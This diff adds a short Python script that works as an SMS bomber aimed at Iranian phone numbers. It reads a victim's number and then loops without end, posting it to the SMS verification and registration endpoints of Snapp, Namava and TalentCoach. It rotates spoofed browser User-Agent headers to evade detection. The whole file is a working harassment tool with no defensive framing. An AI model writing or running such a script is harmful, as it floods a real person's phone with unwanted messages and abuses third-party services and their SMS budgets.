@@ -1,0 +1,54 @@
+import requests
+import random
+import time
+
+print("It`s Me")
+
+number = input("Inter your phone number (without 0) : ")
+url_snapp2 = "https://api.snapp.ir/api/v1/sms/link"
+json_snapp2 = {"phone" : "0" + number }
+
+url_nama = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request"
+json_nama = {"UserName " : "+98" + number}
+
+url_tlnt = "https://rest.talentcoach.ir/api/v1/service/trainees/"
+jsno_tlnt = {"cellphone": "+98" + number}
+
+heads = [
+
+{
+    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
+    'Accept': '*/*'
+    },
+     {
+    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
+    'Accept': '*/*'
+    },
+     {
+    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
+    'Accept': '*/*'
+    },
+     {
+    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
+    'Accept': '*/*'
+    },
+     {
+    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
+    'Accept': '*/*'
+    },
+
+]
+
+while True:
+    random_head = random.choice(heads)
+
+    req1 = requests.post(url= url_snapp2,json=json_snapp2,headers=random_head)
+    print('1 SMS-SENT')
+    
+    req2 = requests.post(url= url_nama,json=json_nama,headers=random_head)
+    print('2 SMS-SENT')
+    
+    req3 = requests.post(url= url_tlnt,json=jsno_tlnt,headers=random_head)
+    print('3 SMS-SENT')
+    
+    time.sleep(1)
